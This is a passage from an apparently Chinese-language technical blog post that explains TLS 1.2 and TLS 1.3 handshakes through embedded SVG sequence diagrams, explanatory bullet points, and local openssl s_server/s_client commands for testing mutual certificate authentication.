y="824.8091">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="761" y="839.9419">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="761" y="855.0747">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="761" y="870.2075">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="761" y="885.3403">&#19979;&#21457;&#26381;&#21153;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="156" x="761" y="900.4731">&#21253;&#21547;&#20027;&#39064;&#12289;&#20844;&#38053;&#12289;&#31614;&#21517;&#31639;&#27861;</text><path d="M519,918.5391 L519,1018.5391 L1235,1018.5391 L1235,928.5391 L1225,918.5391 L519,918.5391 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1225,918.5391 L1225,928.5391 L1235,928.5391 L1225,918.5391 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="105" x="525" y="935.606">Certificate Verify</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="525" y="950.7388">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="541" y="965.8716">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="525" y="981.0044">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="245" x="541" y="996.1372">Handshake Type: Certificate Verify(15)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="663" x="557" y="1011.27">&#26381;&#21153;&#31471;&#20351;&#29992;&#35777;&#20070;&#31169;&#38053;&#23545;&#35777;&#20070;&#21069;&#30340;&#25152;&#26377;&#25569;&#25163;&#25968;&#25454;&#25688;&#35201;&#21518;&#36827;&#34892;&#31614;&#21517;&#65292;&#35777;&#26126;&#35777;&#20070;&#26159;&#33258;&#24049;&#25345;&#26377;&#30340;&#65292;&#23458;&#25143;&#31471;&#20250;&#20351;&#29992;&#20844;&#38053;&#36827;&#34892;&#39564;&#35777;</text><path d="M755,1029.3359 L755,1129.3359 L999,1129.3359 L999,1039.3359 L989,1029.3359 L755,1029.3359 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M989,1029.3359 L989,1039.3359 L999,1039.3359 L989,1029.3359 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="52" x="761" y="1046.4028">Finished</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="761" y="1061.5356">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="761" y="1076.6685">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="761" y="1091.8013">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="192" x="761" y="1106.9341">Handshake Type: Finished(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="761" y="1122.0669">server hello&#32467;&#26463;</text><polygon fill="#181818" points="865.5,1152.2656,875.5,1156.2656,865.5,1160.2656,869.5,1156.2656" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="246.5" x2="871.5" y1="1156.2656" y2="1156.2656"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="198" x="253.5" y="1151.1997">Change Chipher Spec, Finished</text><path d="M107,1169.2656 L107,1224.2656 L385,1224.2656 L385,1179.2656 L375,1169.2656 L107,1169.2656 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M375,1169.2656 L375,1179.2656 L385,1179.2656 L375,1169.2656 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="113" y="1186.3325">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="113" y="1201.4653">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="113" y="1216.5981">&#21578;&#30693;&#26381;&#21153;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M124,1234.6641 L124,1334.6641 L368,1334.6641 L368,1244.6641 L358,1234.6641 L124,1234.6641 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M358,1234.6641 L358,1244.6641 L368,1244.6641 L358,1234.6641 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="52" x="130" y="1251.731">Finished</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="130" y="1266.8638">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="130" y="1281.9966">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="130" y="1297.1294">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="192" x="130" y="1312.2622">Handshake Type: Finished(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="130" y="1327.395">server hello&#32467;&#26463;</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1240" x="0" y="1361.0273"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1240" y1="1361.0273" y2="1361.0273"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1240" y1="1364.0273" y2="1364.0273"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="117" x="561.5" y="1350.4609"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="98" x="567.5" y="1366.5278">&#24320;&#22987;ssl&#25968;&#25454;&#20256;&#36755;</text><!--SRC=[pLPRJnj757xVNp6FYqHIR8fKMI9IHD9IALMZGljghUm9Nc5sjzubWZSRXSJ6c4i9iRac9e0f5o-eBHZRX1_JdTdrK_z2p-miou893QbKbHSyi-TyPywPxtndD2bbo35PanG3nP8oLWn12spfEFKSfmIXjnVfUfBEbcaktoeTq-eVgBTN4BZ7lGVSB8Bwt3NgnycaAYYgWP4A-nV0_1zAk5_xLCLWgy5n3KTGlwJ4zOGqZCLmk4FmLzxN8AmOwX0G-WcdT5bLqE2J0HIw7qPYrrXNTrTt1tAMpkmNnxHa6aaTFf3gUcjfqjdEsAjvCZVJMjkmbr_eevgcfWmSZpxdC3eWsjKY_MsHR1Mjnh5rNgOP4_N9MW9EFp0g6vYPi3yoFKdczeZvilNBbbNVf8KDxlXdEkFKzwp6cLFTTCoClqdCKxjoIARUWOk_oV7fV8aTpDq4zDRoB5sjqyL3z0EahuvS1CmLoCgALTib1qLdQiAgrR_vRX3zgCXZj7ZSAlx-LtEQRAoJPjtpJrV04PAdhqqwdO5ixLoMhkwZnsDGRZVP26elWFXbDokhOvxGembmegi5CbKcSuLBluX7XgWYZM2nYvdR1n_0X2naIMtQgr-sw9HthZZ9GufaZAPmL4eEgIdPI8peOiYD5gnYq6KOZqVX-bDOx74lsot3x7mBgbdTeDaJUyyaa_lWUWs3xfH9SpQ8fEd3KOQ6ns89IHd2qH4rZY7P7X-spHtgwLGoLYrFtvmwbVUjLrC2LkA8aLaGU0NkFU1CZg01Tys9sOdwt1W-RJGSwqIFbLXgN8DI1ou0B36qs3Cv9XduoeBnMdustec-bXLPJ-1ue8cyLWo6l5CJ1Ht5C2_0HpZtcQn3o6ekE-QQ78TWkjkVtpxo8UtNErPzXcmMs0_NZe7u5rhRjkeloU4HDs2VvhP9TWbsw9j3qgYxE7QvIghBmLQzqgJ2zIlz9rPTy8hJFSYhO0_TeO4yq9LrICFFZHviGXb1Co4hg_4U6eG3knBLpU79wN4hdQFvN_acM781ise5A1O711oQNo17YvUCRAD7EmUlaQJTG0n3CvFvAVljbdzaTj9Qdiibq8CMgY1LNCNWccw9VnFVXUyrwUVH2nu-rBGa8pkZnoF9aCGmL8u70zc6beCO8DL-u3kH_8RmubSCFkraz-t64aCjcH0DTeYhTAGmwrIhzb63hESPwxOd7Zvvse-UfbH3ZQd924eOXlP5w7xejg9VTl2_pJM0TAS9UUadXa9k362sJskOIDRfji27brLhj3PAR3QvP8SVNCUzIVH9QNf2zGdPkhBmcRVBV6_9r3k46EgvR3q_PUli77I49svNCf0eZ6A-175ZyNDfkfhZJnf-5ZwGuNJE-OfJdkPLOVF0pD3I3FTbIRpQ9IT7qB_W3ZX15ODMvN5vQJbEQvSXt59NN-p_kpwv2EdsFZy6VvVPZGMwzZOmyjgUU9v-989JxePnvRtvRZ3_Y20bRbGa_pxlhaZU2VxNrOLtDMccIINFNjTk8Alvplcmm5xNVmC0]--></g></svg>

<ul>
<li>密钥交换就是ECDHE的密钥交换过程</li>
<li>身份认证在服务端下发Certificate时，客户端会根据是否授信防中间人攻击；在服务端下发<code>Certificate Verify</code>时会使用私钥对前面的握手信息进行签名，客户端验签通过说明是持有私钥的服务端下发的数据，做身份认证</li>
<li>这里和tls1.2中不一样的地方就是tls1.3没有<code>Server Key Exchange</code>请求了，DH参数在<code>Server Hello</code>中就下发了，这时没有证书信息下发，所以不进行签名。可以进行加密传输后，再使用<code>Certificate Verify</code>来保证私钥是服务端持有的</li>
<li>对称加密和摘要算法就都一样</li>
</ul>
<h3 id="5-1-握手过程解释"><a href="#5-1-握手过程解释" class="headerlink" title="5.1. 握手过程解释"></a>5.1. 握手过程解释</h3><ul>
<li>在client hello阶段就已经客户端选择好密钥交换算法并给出了自己的公钥信息<ul>
<li>client hello中的version虽然写的tls1.2，是因为历史原因，只能写tls1.2，实际支持版本是拓展中的supported_versions字段给出的</li>
<li>由于很多服务器或网关设备写死了tls版本必须是tls1.2，tls1.3为了推行而不改变网络部署，伪装到tls1.2中进行传输，所以version为1.2</li>
<li>支持tls1.3的客户端在client hello中一定会有supported_versions的拓展</li>
</ul>
</li>
<li>server hello阶段给出了服务端的公钥信息，这个时候双方都持有了对方的公钥<ul>
<li>server hello中的version虽然写的tls1.2，也是因为历史原因，只能写tls1.2。具体选择的版本要看后面拓展的supported_versions的回复</li>
<li>不支持tls1.3的服务端不会回复supported_versions的拓展</li>
</ul>
</li>
<li>使用双方公钥和双方随机数就可以计算出预主密钥，这一步就已经可以加密传输了</li>
<li>这里比tls1.2少了一个rtt，加快速度</li>
<li>使用ecdh进行密钥交换，也比rsa更加安全</li>
<li>tls1.3不再支持rsa的密钥交换算法了，默认使用ecdhe的方式交换</li>
<li>身份认证是在<code>Certificate Verify</code>中进行，根据证书的算法使用私钥对握手数据进行签名，客户端使用公钥校验证明是服务端持有私钥</li>
</ul>
<h3 id="5-2-psk-key-exchange-modes"><a href="#5-2-psk-key-exchange-modes" class="headerlink" title="5.2. psk_key_exchange_modes"></a>5.2. psk_key_exchange_modes</h3><p>psk_key_exchange_modes是一种TLS协议中的扩展，用于指定预共享密钥（PSK）交换的模式。根据TLS 1.3规范，psk_key_exchange_modes共有4种模式，分别为：</p>
<ul>
<li>PSK with (EC)DHE key establishment：使用预共享密钥和(Elliptic Curve)有限域Diffie-Hellman(ECDHE)密钥交换。</li>
<li>PSK with (EC)DHE key establishment, and PFS：使用预共享密钥和(Elliptic Curve)有限域Diffie-Hellman(ECDHE)密钥交换，并提供前向保密性（Perfect Forward Secrecy，PFS）。</li>
<li>PSK with (EC)DHE key establishment, and PFS with early data：使用预共享密钥和(Elliptic Curve)有限域Diffie-Hellman(ECDHE)密钥交换，并提供PFS和早期数据传输。</li>
<li>PSK without (EC)DHE key establishment (i.e., 0-RTT)：仅使用预共享密钥进行握手，不进行(Elliptic Curve)有限域Diffie-Hellman(ECDHE)密钥交换，从而实现0-RTT握手。</li>
</ul>
<h2 id="6-双向认证流程"><a href="#6-双向认证流程" class="headerlink" title="6. 双向认证流程"></a>6. 双向认证流程</h2><h3 id="6-1-tls1-2的rsa证书双向认证"><a href="#6-1-tls1-2的rsa证书双向认证" class="headerlink" title="6.1. tls1.2的rsa证书双向认证"></a>6.1. tls1.2的rsa证书双向认证</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端命令</span></span><br><span class="line">openssl s_server -accept 7777 -state -debug -key domain.key -cert domain.crt -CAfile cacert.pem -Verify 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端命令</span></span><br><span class="line">openssl s_client -connect 127.0.0.1:7777 -cipher RSA -tls1_2 -debug -keylogfile test.log -cert domain.crt -key domain.key</span><br></pre></td></tr></table></figure>

<p><img src="/2023-06-19-01.png"></p>
<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="1867px" preserveAspectRatio="none" style="width:1359px;height:1867px;background:#FFFFFF;" version="1.1" viewBox="0 0 1359 1867" width="1359px" zoomAndPan="magnify" class="kroki">$2<defs/><g><text fill="#000000" font-family="sans-serif" font-size="14" font-weight="bold" lengthAdjust="spacing" textLength="167" x="592" y="27.9951">tls1.2&#30340;rsa&#35777;&#20070;&#21452;&#21521;&#35748;&#35777;</text><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="401" x2="401" y1="73.5938" y2="1832.4141"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="1087" x2="1087" y1="73.5938" y2="1832.4141"/><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="376" y="42.2969"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="383" y="62.292">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="376" y="1831.4141"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="383" y="1851.4092">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="1059" y="42.2969"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="1066" y="62.292">server</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="1059" y="1831.4141"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="1066" y="1851.4092">server</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1352" x="0" y="104.1602"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1352" y1="104.1602" y2="104.1602"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1352" y1="107.1602" y2="107.1602"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="108" x="622" y="93.5938"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="89" x="628" y="109.6606">tcp&#24314;&#31435;&#23436;&#25104;&#21518;</text><polygon fill="#181818" points="1075.5,143.8594,1085.5,147.8594,1075.5,151.8594,1079.5,147.8594" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="401.5" x2="1081.5" y1="147.8594" y2="147.8594"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="72" x="408.5" y="142.7935">Client Hello</text><path d="M178,160.8594 L178,336.8594 L625,336.8594 L625,170.8594 L615,160.8594 L178,160.8594 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M615,160.8594 L615,170.8594 L625,170.8594 L615,160.8594 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="68" x="184" y="177.9263">client hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="184" y="193.0591">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="426" x="184" y="208.1919">Version: TLS 1.0 (0x0301)   &#36825;&#20010;&#21487;&#20197;&#24573;&#30053;&#65292;Handshake&#40664;&#35748;&#23601;&#26159;tls1.0</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="204" x="184" y="223.3247">Handshake Type: Client Hello(1)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="317" x="200" y="238.4575">Version: TLS 1.2 (0x0303)  &#23458;&#25143;&#31471;&#25903;&#25345;&#30340;&#26368;&#39640;tls&#29256;&#26412;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="167" x="200" y="253.5903">&#31639;&#27861;&#22871;&#20214;&#20449;&#24687; Cipher Suites</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="377" x="216" y="268.7231">&#21253;&#21547;&#23494;&#38053;&#20132;&#25442;&#31639;&#27861;&#12289;&#36523;&#20221;&#35748;&#35777;&#31639;&#27861;&#12289;&#23545;&#31216;&#21152;&#23494;&#31639;&#27861;&#12289;&#20449;&#24687;&#25688;&#35201;&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="200" y="283.856">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="216" y="298.9888">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="254" x="200" y="314.1216">&#35831;&#27714;&#30340;&#26381;&#21153;&#21517; Extension: server_name(0)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="339" x="200" y="329.2544">&#31614;&#21517;&#21704;&#24076;&#31639;&#27861;&#21015;&#34920; Extension: signature_algorithms(13)</text><polygon fill="#181818" points="412.5,359.4531,402.5,363.4531,412.5,367.4531,408.5,363.4531" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="406.5" x2="1086.5" y1="363.4531" y2="363.4531"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="404" x="418.5" y="358.3872">Server Hello, Certificate, Certificate Request, Server Hello Done</text><path d="M827,376.4531 L827,507.4531 L1347,507.4531 L1347,386.4531 L1337,376.4531 L827,376.4531 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1337,376.4531 L1337,386.4531 L1347,386.4531 L1337,376.4531 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="78" x="833" y="393.52">Server Hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="833" y="408.6528">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="210" x="833" y="423.7856">Handshake Type: Server Hello(2)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="280" x="849" y="438.9185">Version: TLS 1.2 (0x0303)  &#30830;&#23450;TLS&#29256;&#26412;&#20026;1.2</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="849" y="454.0513">Random &#38543;&#26426;&#25968;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="865" y="469.1841">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="483" x="849" y="484.3169">Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d) &#30830;&#23450;&#31639;&#27861;&#22871;&#20214;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="4" x="833" y="499.4497">&#160;</text><path d="M974,517.5156 L974,602.5156 L1200,602.5156 L1200,527.5156 L1190,517.5156 L974,517.5156 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1190,517.5156 L1190,527.5156 L1200,527.5156 L1190,517.5156 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="980" y="534.5825">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="980" y="549.7153">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="980" y="564.8481">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="996" y="579.981">&#19979;&#21457;&#26381;&#21153;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="143" x="1012" y="595.1138">&#21253;&#21547;&#35777;&#20070;&#20449;&#24687;&#12289;&#35777;&#20070;&#20844;&#38053;</text><path d="M944,613.1797 L944,698.1797 L1231,698.1797 L1231,623.1797 L1221,613.1797 L944,613.1797 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1221,613.1797 L1221,623.1797 L1231,623.1797 L1221,613.1797 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="950" y="630.2466">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="950" y="645.3794">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="950" y="660.5122">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="966" y="675.645">&#19979;&#21457;&#26381;&#21153;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="234" x="982" y="690.7778">&#21253;&#21547;&#35777;&#20070;&#20449;&#24687;&#12289;&#35777;&#20070;&#20844;&#38053;&#12289;&#35777;&#20070;&#31614;&#21517;&#20449;&#24687;</text><path d="M838,708.8438 L838,869.8438 L1336,869.8438 L1336,718.8438 L1326,708.8438 L838,708.8438 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1326,708.8438 L1326,718.8438 L1336,718.8438 L1326,708.8438 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="121" x="844" y="725.9106">Certificate Request</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="844" y="741.0435">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="265" x="844" y="756.1763">Handshake Type: Certificate Request (13)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="359" x="860" y="771.3091">&#35201;&#27714;&#23458;&#25143;&#31471;&#25552;&#20132;&#35777;&#20070;&#65292;&#19968;&#33324;&#26159;nginx&#37197;&#32622;&#20013;&#24320;&#21551;&#20102;&#23545;&#31471;&#35777;&#20070;&#26657;&#39564;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="286" x="860" y="786.4419">Certificate types (3 types) &#20801;&#35768;&#25552;&#20132;&#30340;&#35777;&#20070;&#31867;&#22411;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="58" x="876" y="801.5747">RSA Sign</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="60" x="876" y="816.7075">DSS Sign</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="77" x="876" y="831.8403">ECDSA Sign</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="413" x="860" y="846.9731">Signature Hash Algorithms (23 algorithms) &#25903;&#25345;&#30340;&#31614;&#21517;&#21644;hash&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="461" x="860" y="862.106">Distinguished Names (135 bytes) CA&#30456;&#20851;&#20449;&#24687;&#65292;&#21482;&#25903;&#25345;&#27492;CA&#19979;&#21457;&#30340;&#30456;&#20851;&#35777;&#20070;</text><path d="M949,880.1719 L949,950.1719 L1226,950.1719 L1226,890.1719 L1216,880.1719 L949,880.1719 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1216,880.1719 L1216,890.1719 L1226,890.1719 L1216,880.1719 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="116" x="955" y="897.2388">Server Hello Done</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="955" y="912.3716">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="256" x="955" y="927.5044">Handshake Type: Server Hello Done(14)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="955" y="942.6372">server hello&#32467;&#26463;</text><polygon fill="#181818" points="1075.5,972.8359,1085.5,976.8359,1075.5,980.8359,1079.5,976.8359" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="401.5" x2="1081.5" y1="976.8359" y2="976.8359"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="662" x="408.5" y="971.77">Certificate, Client Key Exchange, Certificate Verify, Change Cipher Spec, Encrypted Handshake Message</text><path d="M5,989.8359 L5,1180.8359 L798,1180.8359 L798,999.8359 L788,989.8359 L5,989.8359 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M788,989.8359 L788,999.8359 L798,999.8359 L788,989.8359 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="11" y="1006.9028">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="11" y="1022.0356">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="11" y="1037.1685">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="27" y="1052.3013">&#25552;&#20132;&#23458;&#25143;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="226" x="27" y="1067.4341">Certificates (2043 bytes) &#35777;&#20070;&#20449;&#24687;&#38598;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="151" x="43" y="1082.5669">Certificate: &#21333;&#20010;&#35777;&#20070;&#20449;&#24687;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="202" x="59" y="1097.6997">signedCertificate &#35777;&#20070;&#30340;&#22522;&#26412;&#20449;&#24687;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="76" x="75" y="1112.8325">subject &#20027;&#39064;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="185" x="75" y="1127.9653">subjectPublicKeyInfo &#20844;&#38053;&#20449;&#24687;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="113" x="75" y="1143.0981">validity &#35777;&#20070;&#26377;&#25928;&#26399;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="297" x="59" y="1158.231">algorithmIdentifier (sha256WithRSAEncryption)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="724" x="59" y="1173.3638">encrypted: 